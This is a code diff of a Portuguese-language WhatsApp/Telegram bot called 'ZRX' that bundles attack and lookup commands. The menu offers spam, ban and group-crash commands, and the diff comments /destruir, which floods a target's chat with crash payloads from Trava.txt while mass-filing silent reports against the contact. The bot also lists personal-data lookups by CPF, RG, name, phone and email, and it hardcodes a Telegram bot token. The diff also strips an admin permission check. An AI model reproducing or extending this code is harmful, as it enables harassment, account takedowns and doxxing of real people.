@@ -16,19 +16,15 @@ http.createServer((req, res) => {
 });
 
 const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
-const ADMIN_TELEGRAM_ID = 7714802499; // Seu ID de Administrador
-
-// Inicialização correta da instância do bot do Telegram
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
 let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
-let numeroConectadoGlobal = "Não conectado";
 
 // Banco de dados em memória para Níveis e Configurações de Grupo
-const dadosUsuarios = {}; 
-const configuracoesGrupos = {}; 
+const dadosUsuarios = {}; // { 'remoteJid_usuario': { xp: 0, level: 1 } }
+const configuracoesGrupos = {}; // { 'idGrupo': { bemVindoTexto: '...', bemVindoFoto: null } }
 
 function consultarAPI(url) {
     return new Promise((resolve) => {
@@ -83,7 +79,6 @@ function buscarFirebase(caminho) {
 async function iniciarWhatsApp(chatId, numeroTelefone) {
     if (reconectando) return;
     reconectando = true;
-    numeroConectadoGlobal = numeroTelefone;
 
     const pastaSessao = path.join(__dirname, 'sessao_teste');
     const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);
@@ -158,13 +153,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             const remoteJid = remoteJidCheck(msg);
             const sender = msg.key.participant || msg.key.remoteJid;
             
-            // Captura completa para cliques em botões interativos modernos e antigos
             const texto = msg.message.conversation || 
                           msg.message.extendedTextMessage?.text || 
-                          msg.message.imageMessage?.caption || 
-                          msg.message.buttonsResponseMessage?.selectedButtonId ||
-                          msg.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
-                          msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson || '';
+                          msg.message.imageMessage?.caption || '';
 
             // Sistema de XP / Nível por mensagem enviada
             if (sender && !msg.key.fromMe) {
@@ -180,94 +171,33 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             if (!texto) return;
             console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
-            // MENU PRINCIPAL COM BOTÕES INTERATIVOS NATIVOS MODERNOS (BAILEYS)
             if (texto.trim() === '/menu') {
-                const agora = new Date();
-                const dataHoraFormatada = agora.toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+                const numeroUsuario = remoteJid.split('@')[0];
+                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
 
                 const menuTexto = 
-                    `🤖 *Bot Name:* ZRX-BANCEK\n` +
-                    `👤 *Usuário:* +${numeroConectadoGlobal}\n` +
+                    `⛩️ *WHATSAPP BOT ZRX* ⛩️\n\n` +
                     `💬 *Suporte:* @Zenithzrx\n` +
-                    `🟢 *Status:* Online\n` +
-                    `📅 *Data/Hora:* ${dataHoraFormatada}\n\n` +
-                    `💥 *Painel de Comandos - Escolha abaixo:*`;
-
-                const caminhoFoto = path.join(__dirname, 'menu.jpg');
-
-                // Estrutura atualizada de botões interativos do Baileys moderno
-                const interactiveButtons = [
-                    {
-                        name: "quick_reply",
-                        buttonParamsJson: JSON.stringify({ display_text: "☔ BUSCA DE IP", id: "/menuip" })
-                    },
-                    {
-                        name: "quick_reply",
-                        buttonParamsJson: JSON.stringify({ display_text: "👁‍🗨 CONSULTAS", id: "/menudados" })
-                    },
-                    {
-                        name: "quick_reply",
-                        buttonParamsJson: JSON.stringify({ display_text: "〽️ WHATSAPP BIG", id: "/menubug" })
-                    },
-                    {
-                        name: "quick_reply",
-                        buttonParamsJson: JSON.stringify({ display_text: "🌐 GESTÃO", id: "/menugestao" })
-                    }
-                ];
-
-                if (fs.existsSync(caminhoFoto)) {
-                    await waSock.sendMessage(remoteJid, {
-                        image: fs.readFileSync(caminhoFoto),
-                        caption: menuTexto,
-                        footer: "ZRX CONTROL SYSTEM",
-                        interactiveButtons: interactiveButtons
-                    });
-                } else {
-                    await waSock.sendMessage(remoteJid, {
-                        text: menuTexto,
-                        footer: "ZRX CONTROL SYSTEM",
-                        interactiveButtons: interactiveButtons
-                    });
-                }
-            }
-            // SUB-MENU 1: 𝕭𝖀𝕾𝕮𝕬 𝕯𝕰 𝕴𝕻 ☔
-            else if (texto.includes('/menuip')) {
-                const subMenuIP = 
-                    `☔ *𝕭𝖀𝕾𝕮𝕬 𝕯𝕰 𝕴𝕻* ☔\n\n` +
+                    `📱 *Número de usuário:* \`${numeroUsuario}\`\n` +
+                    `⭐ *Status:* FREE USER\n` +
+                    `🕒 *Online:* ${dataHoraAtual}\n\n` +
+                    `┏━━━⧼𝑰𝑷 & 𝑳𝑰𝑵𝙆⧽\n` +
                     `> /ip <endereço>\n` +
-                    `> /linkIP\n\n` +
-                    `_Envie o comando desejado._`;
-                await waSock.sendMessage(remoteJid, { text: subMenuIP });
-            }
-            // SUB-MENU 2: 𝕮𝕺𝕹𝕾𝕴𝕷𝕿𝕬𝕾 𝕯𝕰 𝕯𝕬𝕯𝕺𝕾 👁‍🗨
-            else if (texto.includes('/menudados')) {
-                const subMenuDados = 
-                    `👁‍🗨 *𝕮𝕺𝕹𝕾𝕴𝕷𝕿𝕬𝕾 𝕯𝕰 𝕯𝕬𝕯𝕺𝕾* 👁‍🗨\n\n` +
+                    `> /linkIP\n` +
+                    `╠━━━⧼𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔𝗦 𝗗𝗔𝗗𝗢𝗦⧽\n` +
                     `> /cpf <cpf>\n` +
                     `> /nome <nome>\n` +
                     `> /consulrg <rg>\n` +
                     `> /telefone <telefone>\n` +
                     `> /email <e-mail>\n` +
-                    `> /cep <cep>\n\n` +
-                    `_Envie o comando desejado._`;
-                await waSock.sendMessage(remoteJid, { text: subMenuDados });
-            }
-            // SUB-MENU 3: 𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕀𝕲 〽️
-            else if (texto.includes('/menubug')) {
-                const subMenuBug = 
-                    `〽️ *𝖂𝕳𝕬𝕿𝕾𝕬𝕻𝕻 𝕭𝕀𝕲* 〽️\n\n` +
+                    `> /cep <cep>\n` +
+                    `╠━━━⧼ATAQUES & AÇÕES⧽\n` +
                     `> /SP4M <número> <qtd>\n` +
                     `> /B4N <número> <qtd>\n` +
                     `> /B4NGRUPO <link> [quantidade]\n` +
                     `> /travgropo <número> <qtd>\n` +
-                    `> /destruir <número> <qtd>\n\n` +
-                    `_Envie o comando desejado._`;
-                await waSock.sendMessage(remoteJid, { text: subMenuBug });
-            }
-            // SUB-MENU 4: 𝕲𝕰𝕽𝕰𝕹𝕮𝕴𝕬𝕸𝕰𝕹𝕿𝕺 🌐
-            else if (texto.includes('/menugestao')) {
-                const subMenuGestao = 
-                    `🌐 *𝕲𝕰𝕽𝕰𝕹𝕮𝕴𝕬𝕸𝕰𝕹𝕿𝕺* 🌐\n\n` +
+                    `> /destruir <número> <qtd>\n` +
+                    `╠━━━⧼𝗚𝗘𝗦𝗧𝗔̃𝗢 & UTILITÁRIOS⧽\n` +
                     `> /kick <número>\n` +
                     `> /promover <número>\n` +
                     `> /rebaixar <número>\n` +
@@ -279,11 +209,21 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     `> /mudar-desc <descrição>\n` +
                     `> /divulgar <texto>\n` +
                     `> /nivel\n` +
-                    `> /setwelcome <texto>\n` +
+                    `> /setwelcome <texto> (com foto opcional)\n` +
                     `> /traduzir <idioma>\n` +
-                    `> /s (Figurinha)\n\n` +
-                    `_Envie o comando desejado._`;
-                await waSock.sendMessage(remoteJid, { text: subMenuGestao });
+                    `> /s (Figurinha)\n` +
+                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
+                
+                const caminhoFoto = path.join(__dirname, 'menu.jpg');
+
+                if (fs.existsSync(caminhoFoto)) {
+                    await waSock.sendMessage(remoteJid, { 
+                        image: fs.readFileSync(caminhoFoto), 
+                        caption: menuTexto 
+                    });
+                } else {
+                    await waSock.sendMessage(remoteJid, { text: menuTexto });
+                }
             }
             else if (texto.startsWith('/ip ')) {
                 const ipAlvo = texto.replace('/ip', '').trim();
@@ -452,7 +392,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                                 fromMe: false,
                                 remoteJid: idGrupo
                             });
-                            await delay(300);
+                            await delay(300); // Velocidade otimizada para grande volume
                         } catch (e) {}
                     }
 
@@ -500,6 +440,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
 
                 await waSock.sendMessage(remoteJid, { text: `🔥 Operação /travgropo finalizada com sucesso nos 5 grupos!` });
             }
+            // COMANDO DESTRUIR TOTAL (TRAVA NO PV + DENÚNCIA NATIVA DE CONTATO SILENCIOSA)
             else if (texto.startsWith('/destruir ')) {
                 const partes = texto.replace('/destruir', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -511,8 +452,10 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+
                 await waSock.sendMessage(remoteJid, { text: `🚨 *ATAQUE TOTAL INICIADO* 🚨\nAlvo: \`${alvoNum}\`\nCiclos: ${quantidade}\n_Disparando travas no PV e denúncias nativas silenciosas simultaneamente..._` });
 
+                // 1. Carrega a trava local (Trava.txt)
                 let conteudoTrava = "⚡ [ZRX-DESTRUCTION] Alvo sob ataque total!";
                 const caminhoPayload = path.join(__dirname, 'Trava.txt');
                 if (fs.existsSync(caminhoPayload)) {
@@ -520,6 +463,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     if (lido.length > 0) conteudoTrava = lido;
                 }
 
+                // Tarefa 1: Envia as travas pesadas para o chat privado do alvo
                 const tarefaTrava = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -529,6 +473,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
+                // Tarefa 2: Aciona a denúncia nativa de contato (botão de denunciar dos três pontos, 100% silenciosa no chat)
                 const tarefaDenunciaNativa = (async () => {
                     for (let i = 1; i <= quantidade; i++) {
                         try {
@@ -545,7 +490,9 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     }
                 })();
 
+                // Executa as duas tarefas em paralelo absoluto
                 await Promise.all([tarefaTrava, tarefaDenunciaNativa]);
+
                 await waSock.sendMessage(remoteJid, { text: `🔥 Ataque total ao número \`${alvoNum}\` finalizado com sucesso!` });
             }
             else if (texto.startsWith('/kick ')) {
@@ -792,15 +739,14 @@ function remoteJidCheck(msg) {
     return msg.key.remoteJid;
 }
 
-// Comando /foto exclusivo para o Administrador (ID: 7714802499) salvar permanentemente a foto do menu
+// Comando /foto no Telegram para definir a imagem do menu de ambas as plataformas
 bot.on('photo', async (msg) => {
     const chatId = msg.chat.id;
-    const userId = msg.from.id;
     const caption = msg.caption || '';
 
-    if (userId === ADMIN_TELEGRAM_ID && (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message)) {
+    if (caption.toLowerCase().startsWith('/foto') || msg.reply_to_message) {
         try {
-            bot.sendMessage(chatId, "🔄 Salvando foto permanente do menu...");
+            bot.sendMessage(chatId, "🔄 Salvando nova foto para o menu do bot...");
 
             const fotoId = msg.photo[msg.photo.length - 1].file_id;
             const fileLink = await bot.getFileLink(fotoId);
@@ -812,14 +758,10 @@ bot.on('photo', async (msg) => {
                 response.pipe(fileStream);
                 fileStream.on('finish', () => {
                     fileStream.close();
-                    bot.sendMessage(chatId, "✅ Foto permanente do menu atualizada com sucesso!");
+                    bot.sendMessage(chatId, "✅ Foto do menu atualizada com sucesso!");
                 });
             });
-        } catch (err) {
-            bot.sendMessage(chatId, "❌ Erro ao salvar a foto.");
-        }
-    } else if (caption.toLowerCase().startsWith('/foto') && userId !== ADMIN_TELEGRAM_ID) {
-        bot.sendMessage(chatId, "❌ Você não tem permissão para alterar a foto do menu.");
+        } catch (err) {}
     }
 });
 
@@ -864,7 +806,7 @@ bot.onText(/\/start/, (msg) => {
     const startTexto = 
         `🤖 *ZRX CONTROL SYSTEM* \n\n` +
         `• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n` +
-        `• Para definir a foto permanente do menu *(Apenas ADM)*: *Envie uma foto com a legenda \`/foto\`*\n` +
+        `• Para atualizar a foto do menu: *Envie uma foto com a legenda \`/foto\`*\n` +
         `• Para limpar sessão: \`/limpar\``;
 
     const caminhoFoto = path.join(__dirname, 'menu.jpg');
